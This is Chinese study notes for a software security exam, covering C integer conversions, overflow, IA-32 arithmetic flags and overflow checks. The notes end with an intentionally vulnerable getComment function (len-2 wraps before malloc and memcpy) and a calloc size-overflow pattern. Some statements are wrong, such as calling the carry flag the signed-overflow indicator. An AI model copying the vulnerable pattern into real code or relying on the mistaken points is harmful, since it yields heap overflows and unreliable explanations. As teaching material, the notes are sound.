<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2073.png" alt="image.png"></p>
<p>4.整数取值范围：一个整数类型的最大值和最小值取决于<strong>该类型的表示法、是否带符号、分配的内存位数大小。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2074.png" alt="image.png"></p>
<h3 id="整数的转换"><a href="#整数的转换" class="headerlink" title="整数的转换"></a>整数的转换</h3><p>1.整型转换</p>
<p>（1）在C和C++中，类型转换<strong>既可能作为转型操作的结果显式发生</strong>，也可能<strong>因为某个操作的需要而隐式发生</strong>。</p>
<p>（2）整型转换可能会导致<strong>数据丢失或错误的表示</strong>。隐式转换是C语言可以<strong>对混合数据类型执行操作能力的结果。</strong></p>
<p>（3）<strong>整型提升、整型转换级别、普通算术转换。</strong></p>
<p>2.整型提升</p>
<p>（1）在比<strong>int小的整型</strong>进行操作（算术运算、函数参数、函数返回值）时，它们会被提升。</p>
<p>（2）如果原始类型的所有值都可以用int表示，<strong>较小的类型会被转换成－个int，否则被转换成－个unsigned int。</strong></p>
<p>（3）整型提升被作为普通算术转换的一个组成部分：<strong>某些自变量表达式、一元的+-和~操作符、移位操作</strong></p>
<p>（4）例子：由于整型提升，因此这里c1和c2都要被提升到int类型的大小：<strong>char c1, c2; c1 &#x3D; c1 + c2;</strong> 然后<strong>两个int类型的数据相加，求和结果被截断</strong>以适应char类型的大小。整型提升主要是为了<strong>防止运算过程中中间结果发生溢出而导致算术错误。</strong></p>
<p>3.隐式转换：<strong>两个不同类型变量</strong>进行算术运算，或不同类型<strong>变量间的赋值</strong>。</p>
<p>考试题：问你输出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> cresult, c1, c2, c3; </span><br><span class="line"><span class="comment">// c1、c2的和超过了signed char类型的最大值（-128~127）</span></span><br><span class="line">c1 = <span class="number">100</span>;</span><br><span class="line">c2 = <span class="number">90</span>;</span><br><span class="line">c3 = <span class="number">-120</span>;</span><br><span class="line">cresult = c1 + c2 + c3;</span><br><span class="line"><span class="comment">// c1与c2相加，该结果随后被截断，并存储在cresult中，**没有数据丢失**</span></span><br><span class="line"><span class="comment">// 然而，由于发生了整型提升，c1、c2和c3都被转换为整型，因此整个表达式的结果能够被成功地计算出来。</span></span><br></pre></td></tr></table></figure>

<p>4.整数转换级别规则</p>
<p>（1）没有任何两种不同的带符号整型<strong>具有相同的级别</strong>，即使它们的（内存）<strong>表示法相同。</strong></p>
<p><strong>（2）低精度的带符号整型的级别比高精度的带符号整型类型的级别低。</strong></p>
<p>（3）long long int类型的级别比long int高，long int的级别比int高，int的级别比short int高，<strong>short int的级别比signed char高。</strong></p>
<p><strong>（4）无符号整型的级别与对应的带符号整型的级别相同。</strong></p>
<p>本质：<strong>每一个bit都不会变化</strong>，只是表示的<strong>意义可能变得不同，比如说符号位的变化</strong>；或者，高位可能被舍弃。</p>
<p>5.从无符号整型转换</p>
<p>（1）从<strong>较小的无符号整型</strong>转换到<strong>较大的无符号整型</strong>总是<strong>安全的</strong>，通常通过对其值<strong>进行零扩展</strong>而完成</p>
<p>（2）当一个<strong>较大的无符号整型</strong>被<strong>转换到一个较小的无符号整型</strong>的时候：<strong>较大的值将会被戳断、低位数据被保留</strong></p>
<p>（3）<strong>当无符号整型转换到其对应的带符号整型</strong>的时候：<strong>位模式（即所有的位数据）将会被保留</strong>，因此没有数据会因此丢失；<strong>最高位数据变成了符号位。</strong>如果该符号位被置位，该值的符号和大小都会发生改变。</p>
<p>注意一下什么时候数据曲解</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2075.png" alt="image.png"></p>
<p>6.带符号整型转换</p>
<p>（1）当一个<strong>非负的带符号整数</strong>被转换为一个<strong>相同大小或更大的无符号整型</strong>的时候：<strong>值不会发生变化，带符号整数需作符号扩展。</strong></p>
<p>（2）当一个<strong>带符号整数</strong>被转换为一个<strong>较短的带符号整数的时候</strong>，则是通过<strong>截断高位完成的。</strong></p>
<p>（3）当<strong>带符号整数转换到无符号整数：其位模式被保留，故不会有数据的丢失。高位失去了符号位的功能。</strong></p>
<p>（4）如果<strong>带符号整型的值非负</strong>，那它的值<strong>不会发生改变。</strong></p>
<p>（5）如果其<strong>值是负数</strong>，得到的<strong>无符号结果将被求值为一个非常大的带符号整数。</strong></p>
<p>注意一下什么时候数据曲解，相同时候</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2076.png" alt="image.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l = ULONG_MAX;</span><br><span class="line"><span class="type">char</span> c = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (c == l) &#123; <span class="comment">// c与1进行相等性比较</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-1 = 4,294,967,295?\n&quot;</span>); </span><br><span class="line"><span class="comment">// 由于整型提升规则发挥作用，导致c被转换成为一个无符号的整数，**其值为0xFFFFFFFF或4,294,967,295**</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>7.带符号或无符号字符</p>
<p>（1）<strong>char类型既可以是带符号的</strong>，也可以是<strong>无符号。</strong></p>
<p>（2）当一个符号位被置位的<strong>signed char</strong>类型的数据被当作整型保存时，其结果就是一个<strong>负数</strong>。</p>
<p>（3）当处理值可能会大于127(0x7F)的字符数据时，对于涉及的字符缓冲区、指针及转型，最好用unsigned char代替char或signed char。</p>
<p>8.普通算术转换</p>
<p>（1）如果两个操作数<strong>具有同样的类型</strong>，则不需要进一步的转换。</p>
<p>（2）如果两个操作数<strong>拥有同样的整型</strong>（带符号或无符号），具有<strong>较低整数转换级别的类型的操作数</strong>会被转换到<strong>拥有较高级别的操作数的类型。</strong></p>
<p>（3）如果具有无符号整型操作数的级别<strong>大于或等于另一个操作数类型的级别</strong>，则带符号整型操作数将<strong>被转换为无符号整型操作数的类型。</strong></p>
<p>（4）如果带符号整型操作数类型能够表示无符号整型操作数类型的所有可能值，则<strong>无符号整型操作数将被转换为带符号整型操作数的类型。</strong>否则，<strong>两个操作数都被转换为与带符号整型操作数类型相对应的无符号整型。</strong></p>
<h4 id="整数错误情形"><a href="#整数错误情形" class="headerlink" title="整数错误情形"></a><strong>整数错误情形</strong></h4><p><strong>整型操作溢出、符号错误、截断错误</strong>会导致非预期的结果。</p>
<p>9.整数溢出：int_max++会变成int_min</p>
<p>（1）当一个整数被增加<strong>超过其最大值</strong>或被减小<strong>小于其最小值</strong>时即会发生整数溢出</p>
<p>（2）<strong>带符号和无符号的数</strong>都有可能发生溢出：<strong>带符号溢出发生于对符号位执行进位时；无符号溢出则发生于当底层表示不再能够表示－个值时。</strong></p>
<p>有相似的练习题，问输出：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">i = INT_MAX; <span class="comment">// 2,147,483,647</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// i = -2,147,483,648</span></span><br><span class="line"></span><br><span class="line">j = UINT_MAX; <span class="comment">// 4,294,967,295;</span></span><br><span class="line">j++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;j = %u\n&quot;</span>, j); <span class="comment">// j = 0</span></span><br><span class="line"></span><br><span class="line">i = INT_MIN; <span class="comment">// -2,147,483,648;</span></span><br><span class="line">i--; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i); <span class="comment">// i = 2,147,483,647</span></span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">j--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;j = %u\n&quot;</span>, j); <span class="comment">// j = 4,294,967,295</span></span><br></pre></td></tr></table></figure>

<p>10.截断错误：大整型到小整型，<strong>高位丢失</strong>，只保留低位。</p>
<p>（1）截断错误发生于<strong>将一个较大整型的数转换到较小的整型</strong>，该数的<strong>原值超出较小类型的表示范围。</strong></p>
<p>（2）原值的<strong>低位被保留下来而高位则被丢弃。</strong></p>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> cresult, c1, c2, c3;</span><br><span class="line">c1 = <span class="number">100</span>;</span><br><span class="line">c2 = <span class="number">90</span>;</span><br><span class="line">cresult1 = c1 + c2;</span><br><span class="line">cresult2 = c1 + c2 + c3;</span><br></pre></td></tr></table></figure>

<ul>
<li>c1加c2超过了signed char(+127)的最大值。当该值赋给一个太小的数据类型的时候，而无法表示结果值的时候。<strong>会发生截断错误。（即cresult1发生整数截断）</strong>在操作前，把比int小的整型提升为int或unsigned int。</li>
<li><strong>cresult2不会</strong>。</li>
</ul>
<p>11.符号错误：即<strong>无符号数和有符号数</strong>之间的转换，由于高位的<strong>标志位代表意义不同</strong>导致的。   </p>
<p>（1）从无符号整型转换到带符号整型。</p>
<p><strong>①相同大小：位模式保留不变，最高位变成符号位。</strong></p>
<p><strong>②更大：进行符号扩展，</strong>然后才执行转换。</p>
<p><strong>③更小：保留低位。</strong></p>
<p>（2）如果无符号整数的<strong>最高位：没被设置，值不变；被设置，变成负值。</strong></p>
<p>（3）带符号整型转换到无符号整型。</p>
<p><strong>①相同大小：位模式保留不变，最高位变成符号位。</strong></p>
<p><strong>②更大：进行符号扩展，</strong>然后才执行转换。</p>
<p><strong>③更小：保留低位。</strong></p>
<p>（4）如果带符号整数的值：<strong>是非负的，值不变；负的，结果通常是一个很大的正值。</strong></p>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">-3</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> u;</span><br><span class="line">u = i; <span class="comment">// 隐式转换为**较小的无符号整数**</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;u = %hu\n&quot;</span>, u);</span><br></pre></td></tr></table></figure>

<ul>
<li>有足够的位来表示值，所以<strong>没有发生截断</strong>。但是补码表示法被解释为一个大的符号值，<strong>所以输出的u&#x3D;65533，FFFD。</strong></li>
</ul>
<h3 id="整数的操作"><a href="#整数的操作" class="headerlink" title="整数的操作"></a>整数的操作</h3><p>整数操作会导致错误和非预期的值。非预期的整数值可能会导致<strong>非预期的程序行为、安全漏洞。</strong>大部分整数操作会导致<strong>异常条件。</strong></p>
<p>1.整数的重要使用场景：<strong>作为数组索引、在任何指针的算术运算中、作为一个对象的长度或大小、作为一个数组边界（例如一个循环计数器）、作为内存分配函数的参数、在对安全要求很关键的代码中。</strong></p>
<p>2.异常情况</p>
<p>（1）不包含算术转换产生的错误</p>
<p>（2）整数错误能够被侦测，有符号溢出和无符号回绕都被描述为适当的先验条件测试和后验条件测试。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2077.png" alt="image.png"></p>
<p>3.整数加法</p>
<p>（1）加法用来将<strong>两个算术操作数或者一个整数与一个指针相加</strong>。如果两个操作数都是算术类型，那么将会对它们执行普通算术转换。如果结果整型占用的位数不足以表示其结果，那么就会导致溢出。</p>
<p>（2）IA-32加法指令：add destination,source。将第一操作数（目的）与第二操作数相加，并<strong>将结果存放到目的操作数</strong>。目的操作数可以是一个<strong>寄存器或者内存位置</strong>。源操作数可以是一个<strong>立即数、寄存器或者内存位置</strong>。侦测和报告<strong>带符号和无符号的整数溢出条件</strong>。</p>
<p>（3）add ax,bx：将16位寄存器bx和16位寄存器ax相加，并将结果存储到寄存器ax中。</p>
<p>（4）加法指令在<strong>标志寄存器</strong>中设置标志：一个用于指示带符号算术溢出的溢出标志、一个用于指示无符号算术溢出的进位标志。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2078.png" alt="image.png"></p>
<p>（5）解释标志：在机器水平上带符号和无符号的整数是没有区别的。整数溢出和进位标志必须要根据实际情况来解。</p>
<p>（6）加法：带符号&#x2F;无符号的char</p>
<p>①当把两个<strong>signed char</strong>相加的时候，它们的值会发生符号扩展。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sc1 + sc2</span><br><span class="line">movsx eax, byte ptr [sc1] </span><br><span class="line">movsx ecx, byte ptr [sc2] </span><br><span class="line">add eax, ecx</span><br></pre></td></tr></table></figure>

<p>②当把两个<strong>unsigned char</strong>相加的时候，它们的值会发生零扩展来避免改变大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">uc1 + uc2</span><br><span class="line">movzx eax, byte ptr [uc1] </span><br><span class="line">movzx ecx, byte ptr [uc2] </span><br><span class="line">add eax, ecx</span><br></pre></td></tr></table></figure>

<p>（7）加法：带符号&#x2F;无符号的int</p>
<p>把两个<strong>unsigned int</strong>相加，为<strong>signed int</strong>的值生成相同的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ui1 + ui2</span><br><span class="line">mov eax, dword ptr [ui1] </span><br><span class="line">add eax, dword ptr [ui2]</span><br></pre></td></tr></table></figure>

<p>（8）加法：带符号的long long int</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sll1 + sll2</span><br><span class="line">mov eax, dword ptr [sll1] </span><br><span class="line">add eax, dword ptr [sll2] # 加法指令使得低<span class="number">32</span> bits相加</span><br><span class="line">mov ecx, dword ptr [ebp<span class="number">-98</span>h] </span><br><span class="line">adc ecx, dword ptr [ebp<span class="number">-0</span>A8h] <span class="meta"># adc指令把高位上的32位和进位标志位的值相加</span></span><br></pre></td></tr></table></figure>

<p>（9）无符号整数溢出检测</p>
<p>①进位标志意味着无符号算术溢出</p>
<p>②无符号整数溢出通过使用下列方法检测：<strong>jc指令(如果有进位标志，则转跳)、jnc指令(如果没有进位标志，则转跳)</strong></p>
<p>③这些跳转指令放在下列条件后：做32位运算时，放在指令add之后；做64位运算时，则放在adc之后。</p>
<p>（10）带符号整数溢出检测</p>
<p><strong>①进位标志意味着带符号算术溢出</strong></p>
<p>②带符号整数溢出通过使用下列方法检测：<strong>jo指令(如果有溢出，则转跳)、jno指令(如果没有溢出，则转跳)</strong></p>
<p>③这些跳转指令放在下列条件后：做32位运算肘，放在指令add之后；做64位运算肘，则放在adc之后。</p>
<p>（11）先验条件</p>
<p><strong>①先检查可能会否溢出！带符号整数的相加可能会导致整数溢出，如果加法操作的左操作数(LHS)和右操作数(RHS)的和大于UINT_MAX（对于int相加而言）或大于UL LONG_MAX（对于unsigned long long相加而言）的话。</strong></p>
<p>②先验条件例子</p>
<p>当A和B是无符号的，并且满足下列条件时，会发生整数溢出：<strong>A + B &gt; UINT_MAX</strong></p>
<p>整数溢出防范检测代码：<strong>A &gt; UINT_MAX – B</strong></p>
<p>当A和B是long long int，并且满足下列条件时，会发生整数溢出：<strong>A + B &gt; ULLONG_MAX</strong></p>
<p>（12）Int类型的带符号整数相加（练习题有一道选择题）</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2079.png" alt="image.png"></p>
<p>（13）后验条件：先执行加法，然后对结果进行评估。</p>
<p>例如: 令<strong>sum &#x3D; lhs + rhs。</strong>如果<strong>lhs</strong>非负且<strong>sum &lt; rhs**，表明发生了溢出；如果**lhs**为负且**sum &gt; rhs，</strong>表明发生了溢出。所有其他的情况则表明加注操作成功完成而无溢出。对于无符号整数来说，如果sum比任意一个操作数小，就表明发生了溢出。</p>
<p>4.整数减法</p>
<p>（1）IA-32指令集包含<strong>sub</strong>(减法)、<strong>sbb</strong>(带借位减法)。sub和sbb指令可以对溢出和进位标志置位，以表示带符号或无符号结果的溢出。</p>
<p>（2）sub指令：sub指令从第一个操作数（目的操作数）中减去第二个操作数（源操作数），并将结果存储在目的操作数中。目的操作数可以是一个<strong>寄存器、内存位置；</strong>源操作数可以是一个<strong>立即数、寄存器、内存位置。</strong></p>
<p>（3）sbb指令：指令sbb通常被用<strong>在多字节或多字减法场合</strong>。sbb指令将源操作数（第二个操作数）和进位标志相加，并从目的操作数（第－操作数）中减去刚才所得的结果。减法操作的结果被存储在目的操作数中。进位标志表示上一个减法操作中是否有借位出现。</p>
<p>（4）带符号long long整型Sub</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sll1 - sll2</span><br><span class="line">mov eax, dword ptr [sll1] </span><br><span class="line">sub eax, dword ptr [sll2] <span class="comment">// sub指令减去低位的32位</span></span><br><span class="line">mov ecx, dword ptr [ebp<span class="number">-0E0</span>h] </span><br><span class="line">sbb ecx, dword ptr [ebp<span class="number">-0F</span>0h] <span class="comment">// sbb指令减去低位的32bits</span></span><br></pre></td></tr></table></figure>

<p>（5）先验条件</p>
<p>①要测试无符号整数减能是否溢出，只需检验是否<strong>LHS &lt; RHS。</strong></p>
<p>②对于具有相同符号的精符号整散，不会发生异常情况</p>
<p>③对于混合符号的带符号整数情形，应用下列规则：如果LHS为负，而RHS为正，对signed int类型检查LHS &lt; INT_MIN **+** RHS；如果LHS非负，且RHS为负，检查LHS &gt; INT_MAX <strong>+</strong> RHS</p>
<p>④例如，0-INT_NIN会导致溢出情况，因为该操作的结果比能表示的最大值还要大1。</p>
<p>（6）后验条件</p>
<p>①如果要测试<strong>带符号整数</strong>的溢出，设difference &#x3D; LHS - RHS，并应用如下规则：如果RHS<strong>非负</strong>，并且<strong>difference &gt; LHS</strong>，则发生了溢出；如果RHS为负，并且difference &lt; LHS，则发生了溢出；其他所有情况，没有溢出发生。</p>
<p>②对于无符号整数而言，如果<strong>difference &gt; LHS</strong>，则发生溢出。</p>
<p>5.整数乘法</p>
<p>（1）乘法操作容易引起溢出错误，因为当进行乘法运算时，即使是较小的操作数也可能导致给定的整数类型溢出。其中一个解决方案是，<strong>为积分配两倍于两个操作数中类型较大者的大小的存储空间。</strong></p>
<p>（2）乘法指令：IA-32指令集包含有一个<strong>mul(无符号乘法)指令、imul(带符号乘法)指令。</strong></p>
<p><strong>mul指令：</strong>用于将第一个操作数（目的操作数）和第二个操作数（源操作数）相乘，并将结果存储在目的操作数中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (OperandSize == <span class="number">8</span>) &#123;</span><br><span class="line">AX = AL * SRC; <span class="comment">// 8位操作数，存储在16位的目的寄存器中</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (OperandSize == <span class="number">16</span>) &#123;</span><br><span class="line">DX:AX = AX * SRC; <span class="comment">// 16位操作数存储在32位目的寄存器中</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">// OperandSize == 32</span></span><br><span class="line">EDX:EAX = EAX * SRC; <span class="comment">// 32位操作数存储在64位目的寄存器中</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>（3）进位标志和整数溢出标志：如果需要高位<strong>来表示两个操作数的积，则进位标志和溢出标志都被置位</strong>；如果不需要高位（也就是说它们全为0），<strong>那么进位标志和溢出标志都被消除。</strong></p>
<p>①带符号和无符号字符乘法(Visual C++)</p>
<p>练习题：考填空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sc_product = sc1 * sc2; </span><br><span class="line">**movsx** eax, byte ptr [sc1] </span><br><span class="line">**movsx** ecx, byte ptr [sc2] </span><br><span class="line">**imul** eax, ecx</span><br><span class="line">mov byte ptr [sc_product], al</span><br><span class="line">uc_product = uc1 * uc2; </span><br><span class="line">movzx eax, byte ptr [uc1] </span><br><span class="line">movzx ecx, byte ptr [uc2] </span><br><span class="line">imul eax, ecx</span><br><span class="line">mov byte ptr [uc_product], al</span><br><span class="line"></span><br><span class="line">si_product = si1 * si2;</span><br><span class="line">ui_product = ui1 * ui2;</span><br><span class="line">mov eax, dword ptr [ui1] </span><br><span class="line">imul eax, dword ptr [ui2] </span><br><span class="line">mov dword ptr [ui_product], eax</span><br></pre></td></tr></table></figure>

<p>②带符号和无符号字符乘法(g++)</p>
<p>不管char是否带符号，g++对char类型的整数都使用mul指令的字节形式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sc_product = sc1 * sc2;</span><br><span class="line">uc_product = uc1 * uc2;</span><br><span class="line">movb <span class="number">-10</span>(%ebp), %al</span><br><span class="line">mulb <span class="number">-9</span>(%ebp)</span><br><span class="line">movb %al, <span class="number">-11</span>(%ebp)</span><br></pre></td></tr></table></figure>

<p>g++对单字长度的整型，则采用imul指令，不管该类型是否带符号。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">si_product = si1 * si2;</span><br><span class="line">ui_product = ui1 * ui2;</span><br><span class="line">movl <span class="number">-20</span>(%ebp), %eax</span><br><span class="line">imull <span class="number">-24</span>(%ebp), %eax</span><br><span class="line">movl %eax, <span class="number">-28</span>(%ebp)</span><br></pre></td></tr></table></figure>

<p>（4）先验条件：为了防止无符号整数相乘时发生溢出，<strong>可以检验A * B &gt; MAX_INT</strong>，也就是A &gt; MAX_INT&#x2F;B，但是除法的开销更大。</p>
<p>（5）后验条件</p>
<p>①后验条件同样<strong>可以用来检测乘法溢出</strong>，不过由于结果需要“两倍于较大操作数的大小”的位数进行表示，因此与加法相比这种情形要复杂一些。</p>
<p><strong>②将两个操作数放到下一个更大的数据类型上，然后相乘。</strong></p>
<p><strong>对于无符号整数：检查下一个大整数的高阶位，如果被设置了，抛出错误。</strong></p>
<p><strong>对带符号整数：如果结果的高半部分及低半部分的符号位全为0或1，则没有发生整数溢出。</strong></p>
<p>③对于16位带符号整数，可以通过这种方式简化对溢出的检测：<strong>将LHS和RHS两个操作数都转型成32位值</strong>，并将乘积<strong>结果存储到32位的目的域中。</strong>如果结果积<strong>右移16位和右移15位</strong>所得结果不一致，则说明发生了溢出。</p>
<p>④对于正的结果，这种方法可以<strong>检测结果值是否溢出到低16位中的符号位</strong>，对于负的结果，这种方法可以<strong>检测结果值是否溢出到高半部分的位中。</strong></p>
<p>6.整数除法</p>
<p>（1）如果32位或64位的带符号整数的MIN_INT值除以-1，那么将会发生溢出。在32位情况下，–2147483648&#x2F;-1的结果应该等于2147483648。由于2147483648无法用带符号的32位整数表示，所以结果出错。**-2147483648&#x2F;-1 &#x3D; -2147483648。**如果参与除法操作的整数的符号和类型不同，那么也容易出问题。</p>
<p>（2）错误检测：IA-32指令集包含如下除法指令<strong>div</strong>,<strong>divpd</strong>,<strong>divps</strong>,<strong>divsd</strong>,<strong>divss,fdiv</strong>,<strong>fdivp</strong>,<strong>fidiv</strong>,<strong>idiv</strong></p>
<p><strong>①div</strong>指令：用源操作数（除数）除存储于ax、dx:ax或edx: eax寄存器中的（无符号）整数（被除数），并将结果存储于ax(ah:al)、dx:ax或edx:eax寄存器中。</p>
<p><strong>②idiv</strong>指令：对（带符号）值执行同样的操作。</p>
<p>③Intel除法指令<strong>div</strong>和<strong>idiv没有设置</strong>整数溢出标志</p>
<p>④下列情况会产生除法错误：<strong>源操作数（除数）为0，</strong>对于目的寄存器而言<strong>结果商值太大。</strong>除法错误会导致一个中断标志向量0。错误报道时，处理器恢复错误指令开始执行时的机器状态。</p>
<p>（3）带符号整数除法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov eax, dword ptr [si_dividend] </span><br><span class="line">cdq</span><br><span class="line">idiv eax, dword ptr [si_divisor] </span><br><span class="line">**si_quotient = si_dividend / si_divisor;**</span><br><span class="line">mov dword ptr [si_quotient], eax</span><br></pre></td></tr></table></figure>

<p>（4）无符号整数除法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">**ui_quotient = ui1_dividend / ui_divisor;**</span><br><span class="line">mov eax, dword ptr [ui_dividend] </span><br><span class="line">xor edx, edx </span><br><span class="line">div eax, dword ptr [ui_divisor] </span><br><span class="line">mov dword ptr [ui_quotient], eax</span><br></pre></td></tr></table></figure>

<p>（5）先验条件：可以通过<strong>检查分子是否为整型的最小值</strong>以及检查<strong>分母是否为-1</strong>来防止整型除法溢出的发生。当然，只要确保<strong>除数不为0</strong>，就可以保证不发生除零错误。</p>
<h3 id="整数的漏洞"><a href="#整数的漏洞" class="headerlink" title="整数的漏洞"></a>整数的漏洞</h3><p>漏洞：一系列<strong>允许违反显式或隐式的安全策略</strong>的情形。安全缺陷可能是<strong>由于硬件层的整数错误或者是跟整数有关的不完善逻辑</strong>所造成的。当这些安全缺陷与其他情形结合起来时，就可能会产生漏洞。</p>
<p>1.JPEG例子：基于在<strong>处理JPEG文件注释域时</strong>存在的实际漏洞</p>
<p>（1）JPEG文件的注释域中包含一个<strong>长为两个字节的长度域</strong>，后者用来指示<strong>注释域的长度</strong>（也包括该两个字节的长度域本身在内）</p>
<p>（2）为了确定注释字符串的单独长度（以便进行内存分配），函数会读取长度域的值并将其减2。</p>
<p>（3）后函数根据注释的长度加上用于表示终结null字符的1个字节所得的总长度来分配内存空间。</p>
<p>Integer整数溢出例子：</p>
<p>*<strong>考试原题（重点，考了n次）：指出并分析下面程序的整数溢出问题</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getComment</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> len, <span class="type">char</span> *src)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">size = len - <span class="number">2</span>;</span><br><span class="line"><span class="type">char</span> *comment = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size + <span class="number">1</span>); </span><br><span class="line"><span class="comment">// 分配到0字节内存可以成功执行，一个极大的正整数0xffffffff</span></span><br><span class="line"><span class="built_in">memcpy</span>(comment, src, size);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">getComment(<span class="number">1</span>, <span class="string">&quot;Comment&quot;</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>分配到0字节内存的调用可以成功执行，<strong>由于size被声明为unsigned int</strong>，当执行size&#x3D;len-2时，<strong>如果len的值小于2，那么len-2的结果将是一个负数。</strong>由于size被声明为unsigned int，它不能表示负数，<strong>此时会发生整数溢出</strong>。例如，如果len为1，len-2结果为-1。在无符号整数的表示中，**-1会被转换为一个非常大的正数(具体值取决于size_t的位数)。**</li>
<li>malloc(size+1)会分配一个非常大的内存块，这可能会导致内存分配失败，因为系统没有足够的连续内存来满足这个请求。memcpy(comment，src，size)会尝试将src中的数据复制到comment中，由于size是一个错误的大值，这可能会导致访问越界，破坏其他内存区域的数据，引发程序崩溃。</li>
<li>getComment(1, “Comment”)：<strong>当图像注释的长度域的数值为1</strong>时可能会产生溢出。当getComment的参数len&#x3D;1时，可能发生<strong>段错误（缓冲区溢出&#x2F;内存访问越界）</strong>，此时size**&#x3D;0xFFFFFFFF**。</li>
</ul>
<p>2.内存分配例子</p>
<p>（1）整数溢出例子也会发生于内存分配calloc()时，当计算一块内存区域的大小并调用calloc()或其他内存分配函数来分配内存时可能会引起整数溢出</p>
<p>（2）可能会返回一个<strong>小于需求大小的缓存</strong>，从而可能会导致后面的缓冲区溢出</p>
<p>（3）以下代码片断可能会产生漏洞</p>
<p>C: <strong>p &#x3D; calloc(sizeof(element_t), count);</strong></p>
<p>C++: <strong>p &#x3D; new ElementType[count];</strong></p>
<p>（4）内存分配</p>
<p>①库函数calloc()接受两个参数：<strong>存储元素类型所需要的空间、元素的个数</strong></p>
<p>②对于C++的new操作符的情形，则<strong>不需要显式指定元素类型大小</strong></p>
<p>③为了计算所需内存的大小，<strong>使用元素个数乘以该元素类型所需的单位空间</strong>来计算</p>
<p>（5）整数溢出条件</p>
<p>①如果计算所得结果无法用带符号整数表示，那么，尽管分配程序看上去能够成功地执行，但实际上它只会分配非常小的内存空间。</p>
<p>②应用程序对分配的<strong>缓冲区的写操作</strong>可能会越界，从而导致基于堆的缓冲区溢出。</p>
<p>3.符号错误例子</p>
<p>考试题：</p>
